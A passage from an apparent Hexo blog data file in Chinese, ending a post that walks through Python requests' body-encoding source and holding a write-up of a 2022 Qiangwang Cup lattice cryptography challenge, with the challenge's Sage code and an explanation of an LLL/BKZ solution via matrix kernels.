class=\"keyword\">raise</span> InvalidJSONError(ve, request=self)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> <span class=\"built_in\">isinstance</span>(body, <span class=\"built_in\">bytes</span>):</span><br><span class=\"line\">            body = body.encode(<span class=\"string\">&quot;utf-8&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    is_stream = <span class=\"built_in\">all</span>(</span><br><span class=\"line\">        [</span><br><span class=\"line\">            <span class=\"built_in\">hasattr</span>(data, <span class=\"string\">&quot;__iter__&quot;</span>),</span><br><span class=\"line\">            <span class=\"keyword\">not</span> <span class=\"built_in\">isinstance</span>(data, (basestring, <span class=\"built_in\">list</span>, <span class=\"built_in\">tuple</span>, Mapping)),</span><br><span class=\"line\">        ]</span><br><span class=\"line\">    )</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> is_stream:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            length = super_len(data)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> (TypeError, AttributeError, UnsupportedOperation):</span><br><span class=\"line\">            length = <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\">        body = data</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">getattr</span>(body, <span class=\"string\">&quot;tell&quot;</span>, <span class=\"literal\">None</span>) <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            <span class=\"comment\"># Record the current file position before reading.</span></span><br><span class=\"line\">            <span class=\"comment\"># This will allow us to rewind a file in the event</span></span><br><span class=\"line\">            <span class=\"comment\"># of a redirect.</span></span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                self._body_position = body.tell()</span><br><span class=\"line\">            <span class=\"keyword\">except</span> OSError:</span><br><span class=\"line\">                <span class=\"comment\"># This differentiates from None, allowing us to catch</span></span><br><span class=\"line\">                <span class=\"comment\"># a failed `tell()` later when trying to rewind the body</span></span><br><span class=\"line\">                self._body_position = <span class=\"built_in\">object</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> files:</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> NotImplementedError(</span><br><span class=\"line\">                <span class=\"string\">&quot;Streamed bodies and files are mutually exclusive.&quot;</span></span><br><span class=\"line\">            )</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> length:</span><br><span class=\"line\">            self.headers[<span class=\"string\">&quot;Content-Length&quot;</span>] = builtin_str(length)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            self.headers[<span class=\"string\">&quot;Transfer-Encoding&quot;</span>] = <span class=\"string\">&quot;chunked&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"comment\"># Multi-part file uploads.</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> files:</span><br><span class=\"line\">            (body, content_type) = self._encode_files(files, data)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> data:</span><br><span class=\"line\">                body = self._encode_params(data)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(data, basestring) <span class=\"keyword\">or</span> <span class=\"built_in\">hasattr</span>(data, <span class=\"string\">&quot;read&quot;</span>):</span><br><span class=\"line\">                    content_type = <span class=\"literal\">None</span></span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    content_type = <span class=\"string\">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        self.prepare_content_length(body)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># Add content-type if it wasn&#x27;t explicitly provided.</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> content_type <span class=\"keyword\">and</span> (<span class=\"string\">&quot;content-type&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> self.headers):</span><br><span class=\"line\">            self.headers[<span class=\"string\">&quot;Content-Type&quot;</span>] = content_type</span><br><span class=\"line\"></span><br><span class=\"line\">    self.body = body</span><br></pre></td></tr></table></figure>\n\n<p>可以看到，<code>data</code> 参数会被 <code>self._encode_params</code> 处理，再看 <code>self._encode_params</code>：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@staticmethod</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">_encode_params</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;Encode parameters in a piece of data.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Will successfully encode parameters when passed as a dict or a list of</span></span><br><span class=\"line\"><span class=\"string\">    2-tuples. Order is retained if data is a list of 2-tuples but arbitrary</span></span><br><span class=\"line\"><span class=\"string\">    if parameters are supplied as a dict.</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(data, (<span class=\"built_in\">str</span>, <span class=\"built_in\">bytes</span>)):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> data</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(data, <span class=\"string\">&quot;read&quot;</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> data</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(data, <span class=\"string\">&quot;__iter__&quot;</span>):</span><br><span class=\"line\">        result = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> k, vs <span class=\"keyword\">in</span> to_key_val_list(data):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(vs, basestring) <span class=\"keyword\">or</span> <span class=\"keyword\">not</span> <span class=\"built_in\">hasattr</span>(vs, <span class=\"string\">&quot;__iter__&quot;</span>):</span><br><span class=\"line\">                vs = [vs]</span><br><span class=\"line\">            <span class=\"keyword\">for</span> v <span class=\"keyword\">in</span> vs:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> v <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">                    result.append(</span><br><span class=\"line\">                        (</span><br><span class=\"line\">                            k.encode(<span class=\"string\">&quot;utf-8&quot;</span>) <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(k, <span class=\"built_in\">str</span>) <span class=\"keyword\">else</span> k,</span><br><span class=\"line\">                            v.encode(<span class=\"string\">&quot;utf-8&quot;</span>) <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(v, <span class=\"built_in\">str</span>) <span class=\"keyword\">else</span> v,</span><br><span class=\"line\">                        )</span><br><span class=\"line\">                    )</span><br><span class=\"line\">        <span class=\"keyword\">return</span> urlencode(result, doseq=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> data</span><br></pre></td></tr></table></figure>\n\n<p>其中</p>"},{"title":"2022 强网杯 Crypto","date":"2022-08-08T02:03:00.000Z","_content":"\n当场做是做不出来的，赛后分析学学吧，不定期更新。\n<!--more-->\n\n## Lattice\n\n```python\nfrom sage.modules.free_module_integer import IntegerLattice\nfrom Crypto.Cipher import AES\nfrom base64 import b64encode\nfrom hashlib import *\nfrom secret import flag\nimport signal\n\nn = 75\nm = 150\nr = 10\nN = 126633165554229521438977290762059361297987250739820462036000284719563379254544315991201997343356439034674007770120263341747898897565056619503383631412169301973302667340133958109\n\ndef gen(n, m, r, N):\n    t1 = [ZZ.random_element(-2^15, 2^15) for _ in range(n*m)]\n    t2 = [ZZ.random_element(N) for _ in range(r*n)]\n    B = matrix(ZZ, n, m, t1)        # B为75*150的矩阵\n    L = IntegerLattice(B)\n    A = matrix(ZZ, r, n, t2)        # A为10*75的矩阵\n    C = (A * B) % N                 # C为10*150的矩阵\n    return L, C\n\ndef pad(s):\n    return s + (16 - len(s) % 16) * b\"\\x00\"\n\nsignal.alarm(60)\ntoken = input(\"team token:\").strip().encode()\nL, C = gen(n, m, r, N)\nprint(C)\nkey = sha256(str(L.reduced_basis[0]).encode()).digest()\naes = AES.new(key, AES.MODE_ECB)\nct = b64encode(aes.encrypt(pad(flag))).decode()\nprint(ct)\n```\n\n题目生成了一个元素在 $[-2^{15},2^{15}]$ 间的矩阵 $B_{75\\times150}$ ，和 $Z_N$ 上的矩阵 $A_{10\\times75}$ 。然后给了一个两矩阵相乘再模 $N$ 的结果 $C$ ，即 $C=AB\\pmod N$ ，需要我们恢复出原来格$B$的最短向量。\n\n比赛时尝试过构造 $\\left[ C \\enspace NI\\right]^T$ ，跑LLL出来的结果很差， BKZ 的话一晚上啥也没出来。。\n赛后只找到 Nu1L 队的 wp ，but 也只有个 exp ，一句解释都没，像我这样的菜鸡分析起来就十分吃力了，但聊胜于无嘛，其他几个队连个 wp 都不放呜呜呜。\n\nexp 中构造了一个 $m+r=150+10=160$ 维的方阵 $A$ 如下：\n$$\nA=\n\\left(\n\\begin{array}{cccc|cccc}\n1 & 0 & \\cdots & 0 & 2^{200}\\cdot c_{0,0} & 2^{200}\\cdot c_{1,0} & \\cdots & 2^{200}\\cdot c_{9,0} \\\\\\\\\n0 & 1 & \\cdots & 0 & 2^{200}\\cdot c_{0,1} & 2^{200}\\cdot c_{1,1} & \\cdots & 0 \\\\\\\\\n\\vdots & \\vdots & \\ddots & \\vdots & \\vdots & \\vdots & \\ddots & 0 \\\\\\\\\n0 & 0 & \\cdots & 1 & 2^{200}\\cdot c_{0,149} & 2^{200}\\cdot c_{1,149} & \\cdots & 2^{200}\\cdot c_{9,149} \\\\\\\\ \\hline\n0 & 0 & \\cdots & 0 & 2^{200}\\cdot N & 0 & \\cdots & 0 \\\\\\\\\n0 & 0 & \\cdots & 0 & 0 & 2^{200}\\cdot N & \\cdots & 0 \\\\\\\\\n\\vdots & \\vdots & \\ddots & \\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\\\\\\n0 & 0 & \\cdots & 0 & 0 & 0 & \\cdots & 2^{200}\\cdot N\n\\end{array}\n\\right)\n$$\n可以看到 $A$ 左上角为一个 $150$ 维的单位阵，左下角为零阵，右上角为 $C$ 的转置数乘 $2^{200}$ ，右下角为一个 $10$ 维的单位阵数乘 $2^{200}\\cdot N$ ，这里乘不乘 $2^{200}$ 得到的结果都是一样的，但神奇的是不乘的话 LLL 耗时会长一些。\n$A$ 跑一遍 LLL 后，取结果的左上角 $75\\times150$ 矩阵，记为 $B$ ，取 $B$ 的核记为 $D$ ，最后 $D$ 跑一遍 BKZ 后的最短向量即为所求。\n> 这里涉及到矩阵的核的概念，核也叫矩阵的零空间，比如 $M$ 的核是方程 $Mx=0$ 的所有解 $x$ 的集合。\n\n那么就不难看出有 $BD^T=O$ ，即 $B^TD=O$\n至于 $C$ 为什么左边要拼接一个单位阵，回忆你已经遗忘的线性代数，这种操作是不是似曾相识？没错说的就是矩阵的求逆，求逆矩阵除了伴随矩阵法，还有一种方法就是初等变换法。\n例如如下一个矩阵求逆\n$$\nM=\n\\begin{pmatrix}\n1 & -4 & -3 \\\\\\\\\n1 & -5 & -3 \\\\\\\\\n-1 & 6 & 4\n\\end{pmatrix}\n$$\n在右边补上一个单位阵，得到\n$$\nA=\n\\left(\n\\begin{array}{ccc|ccc}\n1 & -4 & -3 & 1 & 0 & 0 \\\\\\\\\n1 & -5 & -3 & 0 & 1 & 0 \\\\\\\\\n-1 & 6 & 4 & 0 & 0 & 1\n\\end{array}\n\\right)\n\\stackrel{初等行变换}{\\longrightarrow}\n\\left(\n\\begin{array}{ccc|ccc}\n1 & 0 & 0 & 2 & 2 & 3 \\\\\\\\\n0 & 1 & 0 & 1 & -1 & 0 \\\\\\\\\n0 & 0 & 1 & -1 & 2 & 1\n\\end{array}\n\\right)\n$$\n此时右边的矩阵 $M^{-1}$ 即为所求\n究其原理，在进行初等行变换的时候，右边的矩阵“记录”下了我们的操作，可以表示为\n$$\nM^{-1}\n\\left[\n    M\\enspace I\n\\right] =\n\\left[\n    I\\enspace M^{-1}\n\\right]\n$$\n回到题目中来，有\n$$\nL\n\\left[\n    I \\enspace C^T\n\\right]\n \\enspace \\% \\enspace N=\n\\left[\n\\begin{matrix}\n    B & O \\\\\\\\\n    R & S\n\\end{matrix}\n\\right]\n$$\n至于右上角为何是一个 $75\\times10$ 的零阵，我也不知道，但 exp 既然这么断言，姑且就这么认为先，那么我们就推测\n$$\nL=\n\\left[\n\\begin{matrix}\n    B \\\\\\\\\n    R\n\\end{matrix}\n\\right]\n,LC^T=\n\\left[\n\\begin{matrix}\n    O \\\\\\\\\n    S\n\\end{matrix}\n\\right]\n\\pmod N\n$$\n即有\n$$\n\\left[\n\\begin{matrix}\n    B \\\\\\\\\n    R\n\\end{matrix}\n\\right]C^T=\n\\left[\n\\begin{matrix}\n    O \\\\\\\\\n    S\n\\end{matrix}\n\\right]\\pmod N\n$$\n得到 $BC^T=O\\pmod N$ ，结合上面 $BD^T=O$ ，推测。。。推测不出来了，然后结合队里大手子的分析如下\n\n记题目中给出的两个矩阵为 $\\mathcal{A}$和$\\mathcal{B}$ ，有\n $\\mathcal{A}\\mathcal{B} = C\\pmod N$\n若有 $B(\\mathcal{A}\\mathcal{B})^T = BC^T = O\\pmod N$ ，则 $B$ 和 $C^T$ 互为左右零空间。\n因此可以通过构造格 $L$ ，使得对格 $L$ 进行格基规约后可以得到一组基 $B$ 满足 $BC^T = O\\pmod N$ ，即 $B$ 的基就是 $C^T$ 在模 $N$ 下的一个左零空间。\n接下来对 $B$ 求解其零空间 $D^T$ 就得到了 $(\\mathcal{A}\\mathcal{B})^T$ 所在的那个空间上了，这里从有限域化为整数域，即 $D=\\mathcal{A}\\mathcal{B}$ ，然后因为 $\\mathcal{B}$ 中所求的行向量是一个短向量，且矩阵 $D^T$ 的行向量是 $\\mathcal{B}$ 的行向量的线性组合，因此对 $D^T$ 进行格基规约算法就可以把 $\\mathcal{B}$ 的短向量给恢复出来。\n\n至此已经有明悟的感觉，但仍是有少许不解，消化一段时间吧。\n","source":"_posts/2022 强网杯 Crypto.md","raw":"---\ntitle: 2022 强网杯 Crypto\ndate: 2022-08-08 10:03:00\ntags: [CTF, Crypto]\ncategories: 题解\n---\n\n当场做是做不出来的，赛后分析学学吧，不定期更新。\n<!--more-->\n\n## Lattice\n\n```python\nfrom sage.modules.free_module_integer import IntegerLattice\nfrom Crypto.Cipher import AES\nfrom base64 import b64encode\nfrom hashlib import *\nfrom secret import flag\nimport signal\n\nn = 75\nm = 150\nr = 10\nN = 126633165554229521438977290762059361297987250739820462036000284719563379254544315991201997343356439034674007770120263341747898897565056619503383631412169301973302667340133958109\n\ndef gen(n, m, r, N):\n    t1 = [ZZ.random_element(-2^15, 2^15) for _ in range(n*m)]\n    t2 = [ZZ.random_element(N) for _ in range(r*n)]\n    B = matrix(ZZ, n, m, t1)        # B为75*150的矩阵\n    L = IntegerLattice(B)\n    A = matrix(ZZ, r, n, t2)        # A为10*75的矩阵\n    C = (A * B) % N                 # C为10*150的矩阵\n    return L, C\n\ndef pad(s):\n    return s + (16 - len(s) % 16) * b\"\\x00\"\n\nsignal.alarm(60)\ntoken = input(\"team token:\").strip().encode()\nL, C = gen(n, m, r, N)\nprint(C)\nkey = sha256(str(L.reduced_basis[0]).encode()).digest()\naes = AES.new(key, AES.MODE_ECB)\nct = b64encode(aes.encrypt(pad(flag))).decode()\nprint(ct)\n```\n\n题目生成了一个元素在 $[-2^{15},2^{15}]$ 间的矩阵 $B_{75\\times150}$ ，和 $Z_N$ 上的矩阵 $A_{10\\times75}$ 。然后给了一个两矩阵相乘再模 $N$ 的结果 $C$ ，即 $C=AB\\pmod N$ ，需要我们恢复出原来格$B$的最短向量。\n\n比赛时尝试过构造 $\\left[ C \\enspace NI\\right]^T$ ，跑LLL出来的结果很差， BKZ 的话一晚上啥也没出来。。\n赛后只找到 Nu1L 队的 wp ，but 也只有个 exp ，一句解释都没，像我这样的菜鸡分析起来就十分吃力了，但聊胜于无嘛，其他几个队连个 wp 都不放呜呜呜。\n\nexp 中构造了一个 $m+r=150+10=160$ 维的方阵 $A$ 如下：\n$$\nA=\n\\left(\n\\begin{array}{cccc|cccc}\n1 & 0 & \\cdots & 0 & 2^{200}\\cdot c_{0,0} & 2^{200}\\cdot c_{1,0} & \\cdots & 2^{200}\\cdot c_{9,0} \\\\\\\\\n0 & 1 & \\cdots & 0 & 2^{200}\\cdot c_{0,1} & 2^{200}\\cdot c_{1,1} & \\cdots & 0 \\\\\\\\\n\\vdots & \\vdots & \\ddots & \\vdots & \\vdots & \\vdots & \\ddots & 0 \\\\\\\\\n0 & 0 & \\cdots & 1 & 2^{200}\\cdot c_{0,149} & 2^{200}\\cdot c_{1,149} & \\cdots & 2^{200}\\cdot c_{9,149} \\\\\\\\ \\hline\n0 & 0 & \\cdots & 0 & 2^{200}\\cdot N & 0 & \\cdots & 0 \\\\\\\\\n0 & 0 & \\cdots & 0 & 0 & 2^{200}\\cdot N & \\cdots & 0 \\\\\\\\\n\\vdots & \\vdots & \\ddots & \\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\\\\\\n0 & 0 & \\cdots & 0 & 0 & 0 & \\cdots & 2^{200}\\cdot N\n\\end{array}\n\\right)\n$$\n可以看到 $A$ 左上角为一个 $150$ 维的单位阵，左下角为零阵，右上角为 $C$ 的转置数乘 $2^{200}$ ，右下角为一个 $10$ 维的单位阵数乘 $2^{200}\\cdot N$ ，这里乘不乘 $2^{200}$ 得到的结果都是一样的，但神奇的是不乘的话 LLL 耗时会长一些。\n$A$ 跑一遍 LLL 后，取结果的左上角 $75\\times150$ 矩阵，记为 $B$ ，取 $B$ 的核记为 $D$ ，最后 $D$ 跑一遍 BKZ 后的最短向量即为所求。\n> 这里涉及到矩阵的核的概念，核也叫矩阵的零空间，比如 $M$ 的核是方程 $Mx=0$ 的所有解 $x$ 的集合。\n\n那么就不难看出有 $BD^T=O$ ，即 $B^TD=O$\n至于 $C$ 为什么左边要拼接一个单位阵，回忆你已经遗忘的线性代数，这种操作是不是似曾相识？没错说的就是矩阵的求逆，求逆矩阵除了伴随矩阵法，还有一种方法就是初等变换法。\n例如如下一个矩阵求逆\n$$\nM=\n\\begin{pmatrix}\n1 & -4 & -3 \\\\\\\\\n1 & -5 & -3 \\\\\\\\\n-1 & 6 & 4\n\\end{pmatrix}\n$$\n在右边补上一个单位阵，得到\n$$\nA=\n\\left(\n\\begin{array}{ccc|ccc}\n1 & -4 & -3 & 1 & 0 & 0 \\\\\\\\\n1 & -5 & -3 & 0 & 1 & 0 \\\\\\\\\n-1 & 6 & 4 & 0 & 0 & 1\n\\end{array}\n\\right)\n\\stackrel{初等行变换}{\\longrightarrow}\n\\left(\n\\begin{array}{ccc|ccc}\n1 & 0 & 0 & 2 & 2 & 3 \\\\\\\\\n0 & 1 & 0 & 1 & -1 & 0 \\\\\\\\\n0 & 0 & 1 & -1 & 2 & 1\n\\end{array}\n\\right)\n$$\n此时右边的矩阵 $M^{-1}$ 即为所求\n究其原理，在进行初等行变换的时候，右边的矩阵“记录”下了我们的操作，可以表示为\n$$\nM^{-1}\n\\left[\n    M\\enspace I\n\\right] =\n\\left[\n    I\\enspace M^{-1}\n\\right]\n$$\n回到题目中来，有\n$$\nL\n\\left[\n    I \\enspace C^T\n\\right]\n \\enspace \\% \\enspace N=\n\\left[\n\\begin{matrix}\n    B & O \\\\\\\\\n    R & S\n\\end{matrix}\n\\right]\n$$\n至于右上角为何是一个 $75\\times10$ 的零阵，我也不知道，但 exp 既然这么断言，姑且就这么认为先，那么我们就推测\n$$\nL=\n\\left[\n\\begin{matrix}\n    B \\\\\\\\\n    R\n\\end{matrix}\n\\right]\n,LC^T=\n\\left[\n\\begin{matrix}\n    O \\\\\\\\\n    S\n\\end{matrix}\n\\right]\n\\pmod N\n$$\n即有\n$$\n\\left[\n\\begin{matrix}\n    B \\\\\\\\\n    R\n\\end{matrix}\n\\right]C^T=\n\\left[\n\\begin{matrix}\n    O \\\\\\\\\n    S\n\\end{matrix}\n\\right]\\pmod N\n$$\n得到 $BC^T=O\\pmod N$ ，结合上面 $BD^T=O$ ，推测。。。推测不出来了，然后结合队里大手子的分析如下\n\n记题目中给出的两个矩阵为 $\\mathcal{A}$和$\\mathcal{B}$ ，有\n $\\mathcal{A}\\mathcal{B} = C\\pmod N$\n若有 $B(\\mathcal{A}\\mathcal{B})^T = BC^T = O\\pmod N$ ，则 $B$ 和 $C^T$ 互为左右零空间。\n因此可以通过构造格 $L$ ，使得对格 $L$ 进行格基规约后可以得到一组基 $B$ 满足 $BC^T = O\\pmod N$ ，即 $B$ 的基就是 $C^T$ 在模 $N$ 下的一个左零空间。\n接下来对 $B$ 求解其零空间 $D^T$ 就得到了 $(\\mathcal{A}\\mathcal{B})^T$ 所在的那个空间上了，这里从有限域化为整数域，即 $D=\\mathcal{A}\\mathcal{B}$ ，然后因为 $\\mathcal{B}$ 中所求的行向量是一个短向量，且矩阵 $D^T$ 的行向量是 $\\mathcal{B}$ 的行向量的线性组合，因此对 $D^T$ 进行格基规约算法就可以把 $\\mathcal{B}$ 的短向量给恢复出来。\n\n至此已经有明悟的感觉，但仍是有少许不解，消化一段时间吧。\n","slug":"2022 强网杯 Crypto","published":1,"updated":"2024-06-11T05:14:46.432Z","comments":1,"layout":"post","photos":[],"_id":"clxa5zocm00017slz46xc0dhq","content":"<p>当场做是做不出来的，赛后分析学学吧，不定期更新。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"Lattice\"><a href=\"#Lattice\" class=\"headerlink\" title=\"Lattice\"></a>Lattice</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sage.modules.free_module_integer <span class=\"keyword\">import</span> IntegerLattice</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\"><span class=\"keyword\">from</span> base64 <span class=\"keyword\">import</span> b64encode</span><br><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> secret <span class=\"keyword\">import</span> flag</span><br><span class=\"line\"><span class=\"keyword\">import</span> signal</span><br><span class=\"line\"></span><br><span class=\"line\">n = <span class=\"number\">75</span></span><br><span class=\"line\">m = <span class=\"number\">150</span></span><br><span class=\"line\">r = <span class=\"number\">10</span></span><br><span class=\"line\">N = <span class=\"number\">126633165554229521438977290762059361297987250739820462036000284719563379254544315991201997343356439034674007770120263341747898897565056619503383631412169301973302667340133958109</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">gen</span>(<span class=\"params\">n, m, r, N</span>):</span><br><span class=\"line\">    t1 = [ZZ.random_element(-<span class=\"number\">2</span>^<span class=\"number\">15</span>, <span class=\"number\">2</span>^<span class=\"number\">15</span>) <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n*m)]</span><br><span class=\"line\">    t2 = [ZZ.random_element(N) <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(r*n)]</span><br><span class=\"line\">    B = matrix(ZZ, n, m, t1)        <span class=\"comment\"># B为75*150的矩阵</span></span><br><span class=\"line\">    L = IntegerLattice(B)</span><br><span class=\"line\">    A = matrix(ZZ, r, n, t2)        <span class=\"comment\"># A为10*75的矩阵</span></span><br><span class=\"line\">    C = (A * B) % N                 <span class=\"comment\"># C为10*150的矩阵</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> L, C</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pad</span>(<span class=\"params\">s</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s + (<span class=\"number\">16</span> - <span class=\"built_in\">len</span>(s) % <span class=\"number\">16</span>) * <span class=\"string\">b&quot;\\x00&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">signal.alarm(<span class=\"number\">60</span>)</span><br><span class=\"line\">token = <span class=\"built_in\">input</span>(<span class=\"string\">&quot;team token:&quot;</span>).strip().encode()</span><br><span class=\"line\">L, C = gen(n, m, r, N)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(C)</span><br><span class=\"line\">key = sha256(<span class=\"built_in\">str</span>(L.reduced_basis[<span class=\"number\">0</span>]).encode()).digest()</span><br><span class=\"line\">aes = AES.new(key, AES.MODE_ECB)</span><br><span class=\"line\">ct = b64encode(aes.encrypt(pad(flag))).decode()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(ct)</span><br></pre></td></tr></table></figure>\n\n<p>题目生成了一个元素在 $[-2^{15},2^{15}]$ 间的矩阵 $B_{75\\times150}$ ，和 $Z_N$ 上的矩阵 $A_{10\\times75}$ 。然后给了一个两矩阵相乘再模 $N$ 的结果 $C$ ，即 $C=AB\\pmod N$ ，需要我们恢复出原来格$B$的最短向量。</p>\n<p>比赛时尝试过构造 $\\left[ C \\enspace NI\\right]^T$ ，跑LLL出来的结果很差， BKZ 的话一晚上啥也没出来。。<br>赛后只找到 Nu1L 队的 wp ，but 也只有个 exp ，一句解释都没，像我这样的菜鸡分析起来就十分吃力了，但聊胜于无嘛，其他几个队连个 wp 都不放呜呜呜。</p>\n<p>exp 中构造了一个 $m+r=150+10=160$ 维的方阵 $A$ 如下：<br>$$<br>A=<br>\\left(<br>\\begin{array}{cccc|cccc}<br>1 &amp; 0 &amp; \\cdots &amp; 0 &amp; 2^{200}\\cdot c_{0,0} &amp; 2^{200}\\cdot c_{1,0} &amp; \\cdots &amp; 2^{200}\\cdot c_{9,0} \\\\<br>0 &amp; 1 &amp; \\cdots &amp; 0 &amp; 2^{200}\\cdot c_{0,1} &amp; 2^{200}\\cdot c_{1,1} &amp; \\cdots &amp; 0 \\\\<br>\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; 0 \\\\<br>0 &amp; 0 &amp; \\cdots &amp; 1 &amp; 2^{200}\\cdot c_{0,149} &amp; 2^{200}\\cdot c_{1,149} &amp; \\cdots &amp; 2^{200}\\cdot c_{9,149} \\\\ \\hline<br>0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 2^{200}\\cdot N &amp; 0 &amp; \\cdots &amp; 0 \\\\<br>0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; 2^{200}\\cdot N &amp; \\cdots &amp; 0 \\\\<br>\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\<br>0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 2^{200}\\cdot N<br>\\end{array}<br>\\right)<br>$$<br>可以看到 $A$ 左上角为一个 $150$ 维的单位阵，左下角为零阵，右上角为 $C$ 的转置数乘 $2^{200}$ ，右下角为一个 $10$ 维的单位阵数乘 $2^{200}\\cdot N$ ，这里乘不乘 $2^{200}$ 得到的结果都是一样的，但神奇的是不乘的话 LLL 耗时会长一些。<br>$A$ 跑一遍 LLL 后，取结果的左上角 $75\\times150$ 矩阵，记为 $B$ ，取 $B$ 的核记为 $D$ ，最后 $D$ 跑一遍 BKZ 后的最短向量即为所求。</p>\n<blockquote>\n<p>这里涉及到矩阵的核的概念，核也叫矩阵的零空间，比如 $M$ 的核是方程 $Mx=0$ 的所有解 $x$ 